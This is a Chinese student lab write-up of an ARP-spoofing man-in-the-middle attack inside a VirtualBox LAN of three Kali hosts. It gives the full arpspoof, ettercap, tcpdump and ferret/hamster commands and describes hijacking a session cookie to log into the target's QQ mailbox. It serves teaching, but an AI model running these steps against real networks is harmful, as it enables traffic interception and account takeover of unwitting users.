## chap0x04基于VirtualBox的局域网中间人劫持攻击实验讲解
### 一、实验名称

基于VirtualBox的局域网中间人劫持攻击实验讲解

### 二、实验要求
 - 利用VirtualBox搭建局域网环境实现中间人劫持攻击。
 - 实施中间人攻击，攻击者首先需要使用arp欺骗或dns欺骗，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是完全透明的，不管是arp欺骗，还是dns欺骗，中间人攻击都改变正常的通讯流，它就相当于会话双方之间的一个透明代理，可以得到一切想知道的信息，甚至是利用一些有缺陷的加密协议来实现。以下进行通过arp欺骗来进行中间人劫夺攻击。
 
   ![](/网络安全/chap0x04/images/2-1-1.png)

### 三、实验网络环境搭建
- 为KaliAttackhost攻击者主机、KaliGateway网关、KaliTarget靶机分别分配一块内部的网卡，使其处在一个局域网中；同时，为KaliGateway设置第二块NAT Network网卡。
- 网络拓扑图

   ![](/网络安全/chap0x04/images/3-1-1.png)
   
### 四、实验过程
- 分别查看KaliAttackhost攻击者主机、KaliGateway网关、KaliTarget靶机的ip地址等相关信息

   ![](/网络安全/chap0x04/images/4-0-1.png)
   ![](/网络安全/chap0x04/images/4-0-2.png)
   ![](/网络安全/chap0x04/images/4-0-3.png)
   
- KaliAttackhost攻击者主机、KaliGateway网关、KaliTarget靶机连通性以及访问互联网测试
此时KaliAttackhost攻击者主机、KaliGateway网关、KaliTarget靶机任意两个节点间可以ping通，同时各个节点均可以访问互联网（baidu.com）
    - 1.KaliAttackhost攻击者主机

    ![](/网络安全/chap0x04/images/4-1-1-1.png)
    ![](/网络安全/chap0x04/images/4-1-1-2.png)
 
    
    - 2.KaliGateway网关

    ![](/网络安全/chap0x04/images/4-1-2-1.png)
    
    - 3.KaliTarget靶机
    
    ![](/网络安全/chap0x04/images/4-1-3-1.png)
    
- 分别查看KaliAttackhost攻击者主机、KaliGateway网关、KaliTarget靶机的arp表，执行

   ```bash
   arp -n
   ```
    - 1.KaliAttackhost攻击者主机

     ![](/网络安全/chap0x04/images/4-2-1-1.png)
     
    - 2.KaliGateway网关

     ![](/网络安全/chap0x04/images/4-2-2-1.png)
     
    - 3.KaliTarget靶机

     ![](/网络安全/chap0x04/images/4-2-3-1.png)
     
- 在KaliAttackhost攻击者主机中查看所在局域网中主机相关信息，寻找可行攻击目标
执行
  ```bash
  nmap -sP 192.168.111.0/24
  ```
  ![](/网络安全/chap0x04/images/4-3-1-1.png)
  
  从执行结果可以看到攻击者主机所在局域网192.168.111.0/24中有三个主机，ip地址分别为192.168.111.1/24，192.168.111.2/24，同时，可以通过latency等信息判断出执行该条命令的主机ip地址为192.168.111.3/24，该局域网中其他主机的MAC地址同样可以获取。
- 选择ip地址为192.168.111.2/24的主机进行arp攻击
- 在攻击者主机执行：
  ```bash
  # 192.168.111.2为靶机的IP地址，192.168.111.1为靶机的默认网关的ip地址
  ```
  ```bash
  arpspoof -i eth0 -t 192.168.111.2 192.168.111.1
  ```

   ![](/网络安全/chap0x04/images/4-3-1-2.png)
   
   从执行结果可以看出，此时Kalitarget靶机不能访问互联网，流量被攻击者主机劫持

- 开启KaliAttackhost攻击者主机的ipv4转发功能，转发来自Kalitarget靶机的流量
   - 1.在靶机执行
  ```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward
  ```
  ![](/网络安全/chap0x04/images/4-4-1-1.png)
  
  - 2.在靶机执行

  ```bash
  cat /proc/sys/net/ipv4/ip_forward
  ```

  ![](/网络安全/chap0x04/images/4-4-2-1.png)
  
  - 3.在靶机执行
   ```bash
   ping baidu.com
   ```
   ![](/网络安全/chap0x04/images/4-4-3-1.png)
   
   通过执行结果可知，KaliAttackhost成功开启arp欺骗的同时开启ipv4转发功能，此时KaliTarget靶机也可以正常上网。

- 执行arpspoof -i eth0 -t 192.168.111.1 192.168.111.2实现对网关的欺骗，此时形成中间人，可以进行劫持攻击
   ```bash
    # 192.168.111.1为靶机的默认网关的ip地址，192.168.111.2为靶机的IP地址网关的ip地址
   ```
   ```bash
   arpspoof -i eth0 -t   192.168.111.1 192.168.111.2
  ```
  
    ![](/网络安全/chap0x04/images/4-5-1-1.png)
    ![](/网络安全/chap0x04/images/4-5-1-2.png)
    
- 分别查看KaliGateway网关、Kalitarget靶机的arp表执行
   ```bash
   arp -n
   ```
   - 1.Kalitarget靶机

    ![](/网络安全/chap0x04/images/4-6-1-1.png)
   
    同一个MAC地址对应两个不同ip192.168.111.1，192.168.111.3
   - 2.KaliGateway网关

    ![](/网络安全/chap0x04/images/4-6-2-1.png)
   
   可以看出同一个MAC地址对应两个不同ip192.168.111.2，192.168.111.3
   arp表被污染，KaliAttackhost攻击者主机成为中间人

五、劫持攻击测试

- 在靶机进行访问互联网操作：访问mail.qq.com，登录QQ邮箱（这是第二次登录，第一次用firefox登登录QQ邮箱时保存了用户名和密码方便以后访问mail.qq.com自动登陆）
   - 1.在攻击者主机执行
   ```bash
   tcpdump -n -i eth0 -w cookie.cap
   ```

     ![](/网络安全/chap0x04/images/5-1-1-1.png)
   
   - 2.在靶机用wireshark对抓获的cookie.cap进行分析，进行过滤筛选后，查看过滤后数据包的tcp追踪http流，获取cookie等相关信息。

     ![](/网络安全/chap0x04/images/5-1-2-1.png)
     ![](/网络安全/chap0x04/images/5-1-2-2.png)
   
   - 3.在攻击者主机利用劫获的数据包中的cookie信息恶意登录靶机登录的网站，还可以进行很多恶意操作。
  
     如利用firefox Modify Headers插件，输入获取的cookie相关信息恶意登录靶机登录的QQ邮箱。
  
     ![](/网络安全/chap0x04/images/5-1-3-1.png)
     ![](/网络安全/chap0x04/images/5-1-3-2.png)
     ![](/网络安全/chap0x04/images/5-1-3-3.png)

- 在靶机进行访问互联网操作：访问mail.qq.com登录QQ邮箱和中国传媒大学教务在线进行相关登录,在攻击者主机实现ettercap嗅探。
  - 1.执行

     ```bash
    ettercap -T -q -M ARP /192.168.111.2// ///
    ```

     ![](/网络安全/chap0x04/images/5-2-1-1.png)
     
  - 2.开启另外一个窗口，执行ettercap -Tq -i eth0
    ```bash
    ettercap -Tq -i eth0
    ```

    ![](/网络安全/chap0x04/images/5-2-2-1.png)
    
    通过实验结果通过该命令嗅探没有获得期待结果
   
   - 3.但后续又执行
     ```bash
     ettercap -T -q -M ARP  /192.168.111.2// /// 
     ```
     ![](/网络安全/chap0x04/images/5-2-3-1.png)
     ![](/网络安全/chap0x04/images/5-2-3-2.png)
     ![](/网络安全/chap0x04/images/5-2-3-3.png)
     
   从执行结果来看，抓取到靶机动作时的流量包。
- 在攻击者主机执行ferret相关命令实现劫持攻击等恶意操作
    - 1.在靶机进行访问互联网操作：访问mail.qq.com，登录QQ邮箱（这是第二次登录，第一次用firefox登登录QQ邮箱时保存了用户名和密码方便以后访问mail.qq.com自动登陆）在攻击者主机执行:

      ```bash
      tcpdump -i eth0 -w cookie.pcap
      ferret -r cookie.pcap
      ```

       ![](/网络安全/chap0x04/images/5-3-1-1.png)
       ![](/网络安全/chap0x04/images/5-3-1-2.png)

       
       从执行结果看呈贡产生产生hamster.txt
     - 2.打开firefox，设置反向代理
     
       ![](/网络安全/chap0x04/images/5-3-2-1.png)
       
     - 3.开启hamster
     
       ![](/网络安全/chap0x04/images/5-3-3-1.png)
       
     - 4.打开firefox，地址栏输入127.0.0.1:1234，进行相关分析
     
       ![](/网络安全/chap0x04/images/5-3-4-1.png)
       ![](/网络安全/chap0x04/images/5-3-4-2.png)
       ![](/网络安全/chap0x04/images/5-3-4-3.png)
       
       从执行结果来看，可知靶机用户浏览了QQ邮箱，百度贴吧等。
- 通过进行上述三种方法的嗅探劫夺攻击等，就本次实验而言，通过第一种方法将获取的cookie相关信息利用firefox自带的Modify Headers插件取得的成果最大，成功登录靶机用户登录的QQ邮箱；第二种方法ettercap对于数据包的分析没有很好的得到实际恶意应用；第三种方法ferret与hamster对靶机用户浏览行为分析，此次试验方法并没有较大收获，后续可结合其他工具多次监听劫夺更有有效信息，进行更多行为。


### 六、实验问题
- [ ] 使用ferret相关命令在安装ferret时出现问题，在攻击者主机执行

  ```bash
   apt install ferret
  ```
  虽然现实成功安装ferret，但是在攻击者主机执行

  ```bash
  ferret -r cookie.pcap
  ```
  对抓取的数据包进行分析时，跳出一个窗口，没有办法得到理想的结果，产生hamster.txt，进而进行接下来的实验

  ![](/网络安全/chap0x04/images/QUE-1-1-1.png)
  
- [x] 尝试下载64位的ferret

   ```bash
   dpkg --add-architecture i386
   apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
   sudo aptitude install ferret-sidejack:i386
   ```
   
   ![](/网络安全/chap0x04/images/QUE-2-1-1.png)
   ![](/网络安全/chap0x04/images/QUE-2-1-2.png)
   ![](/网络安全/chap0x04/images/QUE-2-1-3.png)
   
   32位ferret安装得到解决